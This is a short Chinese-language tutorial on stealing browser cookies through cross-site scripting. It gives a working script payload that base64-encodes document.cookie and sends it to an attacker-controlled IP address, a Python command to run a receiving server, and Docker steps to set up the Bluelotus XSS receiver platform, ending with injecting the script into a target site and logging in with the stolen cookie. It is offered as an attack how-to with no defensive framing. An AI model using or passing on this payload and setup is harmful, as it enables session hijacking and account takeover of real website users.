### 通过XSS盗取Cookie

前提条件：

```
- 目标网站没有使用http-only
- 受害者可以访问到接收端
- 或许到Cookie后目标用户没有退出登录
```

#### 1. 利用方法

##### （1）方法一

Payload：

```javascript
<script>
window.open('http://192.168.81.238:2333/?q='+btoa(document.cookie))
</script>
```

> document.cookie用来创建、读取、删除cookie。
>
> 打开一个新的标签页，将document.cookie获取到的cookie进行base64编码拼接到URL里的q的参数值并访问该URL。

1. 攻击者启动Web服务用于接收cookie，使用python3启动一个简易的http服务（受害者浏览器需能够访问该服务器）：

   ```
   python -m http.server --bind 0.0.0.0 1234
   ```

##### （2）方法二

`Bluelotus_XSSReceiver` 清华大学蓝莲花战队做的一个平台，优点是足够小，不需要数据库，只要有个能 运行php的环境就可以，缺点是一般只适合一个人用。

1. 配置蓝莲花

   - 拉取docker镜像

     ```
     sudo docker pull romeoz/docker-apache-php:5.6
     ```

   - 启动容器

     ```
     sudo docker run -d -p 9944:80 -v /opt/bluelotus:/var/www/app romeoz/docker-apache-php:5.6
     ```

   - 修改配置

     ```
     mv bluelotus/config-sample.php bluelotus/config.php
     sudo chmod 777 bluelotus/myjs/
     sudo chmod 777 bluelotus/data/
     ```

   - 访问 `http://your-ip:port/login.php` ，密码为：`bluelotus` 

   - 修改相关配置

   - 在目标网站提交 js 代码

   - 获取受害者 cookie 登录网站
